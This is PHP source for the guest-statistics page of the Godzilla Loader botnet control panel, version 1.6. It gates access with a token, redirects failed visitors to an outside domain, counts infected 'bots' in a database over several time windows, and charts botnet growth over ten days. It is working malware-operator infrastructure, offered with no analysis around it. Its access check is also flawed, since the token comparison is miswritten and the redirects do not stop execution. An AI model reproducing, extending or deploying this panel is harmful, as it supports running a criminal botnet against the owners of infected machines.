<?php
error_reporting(E_ALL);
session_start();
@set_time_limit(0);
@ini_set('max_execution_time', 0);
header('Content-Type: text/html; charset=utf-8');
ob_start();
define('CP', TRUE);

if(!is_readable(__DIR__.'/core/config.php')){
	header('Location: http://huyandex.com');
}
require __DIR__.'/core/config.php';

if($PANEL_GUESTSTATS == FALSE)
	die("<h1 style=\"color:red;text-align:center\">DISABLED</h1>");

if(empty($_GET['access_token']))
	header('Location: http://huyandex.com');
else
	if(!htmlspecialchars($_GET['access_token']) == $PANEL_GUESTSTATS)
		header('Location: http://huyandex.com');


  
 
$database = @new mysqli($MYSQL_HOST, $MYSQL_LOGIN, $MYSQL_PASSWORD, $MYSQL_DB);
if (mysqli_connect_error()) {
	header('Location: huyandex.com');
}
@mysqli_query($database, 'SET NAMES "utf8" COLLATE "utf8_unicode_ci";');

include __DIR__.'/core/common.php';


	$bots_total = 0;
	$bots_per_day = 0;
	$bots_per_hour = 0;
	$bots_per_quarter = 0;
	
	$now = time();
	$sql = "SELECT COUNT(*) FROM `bots` WHERE `time` > {$now}-(60*15)"; 
	$result = mysqli_query($database, $sql) or die(); 
	$row = mysqli_fetch_row($result) or die(); 
	mysqli_free_result($result);
	$bots_per_quarter = $row[0];
	

	$sql = "SELECT COUNT(*) FROM `bots` WHERE `time` > {$now}-(60*60)"; 
	$result = mysqli_query($database, $sql) or die(); 
	$row = mysqli_fetch_row($result) or die(); 
	mysqli_free_result($result);
	$bots_per_hour = $row[0];
	
	$sql = "SELECT COUNT(*) FROM `bots` WHERE `time` > {$now}-(60*60*24)"; 
	$result = mysqli_query($database, $sql) or die(); 
	$row = mysqli_fetch_row($result) or die(); 
	mysqli_free_result($result);
	$bots_per_day = $row[0];
	
	$sql = "SELECT COUNT(*) FROM `bots`"; 
	$result = mysqli_query($database, $sql) or die(); 
	$row = mysqli_fetch_row($result) or die(); 
	mysqli_free_result($result);
	$bots_total = $row[0];
	$sql = "";
	$grafik_labels = "";
	$time_last = $now;
	for($j = 10; $j > 1;$j--)
	{
		$time_cur = $now-(60*60*24*$j);
		$sql .= "SELECT COUNT(*) FROM `bots` WHERE `time` BETWEEN {$time_cur} AND {$time_last};\r\n"; 
		$time_last = $time_cur;
		$grafik_labels .= "\"".date("F j", $now-(60*60*24*$j))."\", ";
	}
	$grafik_labels = substr($grafik_labels, 0, -2);
	
	$result = mysqli_multi_query($database, $sql) or die(mysqli_error($database)); 
	$grafik_dannie = "";
	do {
        /* получаем первый результирующий набор */
        if ($result = mysqli_store_result($database)) {
            while ($row = mysqli_fetch_row($result)) {
               $grafik_dannie .= $row[0].", ";
            }
            mysqli_free_result($result);
        }
        if (mysqli_more_results($database)) {
        }
    } while (mysqli_more_results($database) && mysqli_next_result($database));
	$grafik_dannie = substr($grafik_dannie, 0, -2);

	$botsperday_percent = round($bots_per_day/($bots_total/100), 2);
	$botsperhour_percent = round($bots_per_hour/($bots_total/100), 2);
	$botsperquarter_percent = round($bots_per_quarter/($bots_total/100), 2);
?>
<!DOCTYPE html>
<html>
	<head>
		<title>Godzilla &#9679; Guest stats</title>
		<style>
		@import url(media/css/vendor.min.css);
		@import url(media/css/dashboard.day.css);
		</style>
		<script type=text/javascript src=media/js/vendor.min.js></script>
		<script type=text/javascript src=media/js/chart.min.js></script>

	</head>
<body class=bg-info>
<div class=container>
<p>&nbsp;</p>
		<div class="panel panel-default" id=main>
			<div class=panel-body style=height:80vh>
		
		<div style="position:absolute;z-index:1;" class="col-xs-4 col-md-offset-4">
			<p>&nbsp;</p>
			<h1 class=text-info><b>Godzilla Loader</b></h1>
			<h4 class="text-muted text-center">Guest statistics</h4>
		</div>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>
			<p>&nbsp;</p>

			<div class="col-md-5">
				<u><h2><b>TOTAL BOTS</u>:</b> <span style="color:black;font-size:130%"><?php echo $bots_total;?></span> <small>(100%)</small></h2>
				<u><h3><b>LAST DAY</u>:</b> <span style="color:black;font-size:130%"><?php echo $bots_per_day;?></span> <small>(<?php echo $botsperday_percent;?>%)</small></h3> 
				<u><h4><b>LAST HOUR</u>:</b> <span style="color:black;font-size:130%"><?php echo $bots_per_hour;?></span> <small>(<?php echo $botsperhour_percent;?>%)</small></h4>
				<u><h5><b>LAST 15 MIN</u>:</b> <span style="color:black;font-size:130%"><?php echo $bots_per_quarter;?></span> <small>(<?php echo $botsperquarter_percent;?>%)</small></h5>
			</div>
		
				<canvas id="BotnetChart"  class="BotnetChart" width="600" height="200"></canvas>
		<script type=text/javascript>

		var ctx = $("#BotnetChart").get(0).getContext("2d");
		var options = {
			animation: false,
			tooltipTemplate: "<%= value %> bots"
		}
		var data = {
			animationSteps: 10,
			labels: [<?php echo $grafik_labels ?>],
			datasets: [
				{
					fillColor: "rgba(220,220,220,0.2)",
					strokeColor: "rgba(220,220,220,1)",
					pointColor: "rgba(220,220,220,1)",
					pointStrokeColor: "#fff",
					pointHighlightFill: "#fff",
					pointHighlightStroke: "rgba(220,220,220,1)",
					data: [<?php echo $grafik_dannie ?>]
				}
					]
			};
		var BotnetChart = new Chart(ctx).Line(data, options);
		
		</script>
			</div>
				<div class="panel-footer text-right"> 
					&copy; Godzilla Loader <span class="small text-muted">ver. 1.6</span>
				</div>
		</div>
		</div>
</body>
</html>

<?php ob_end_flush();?>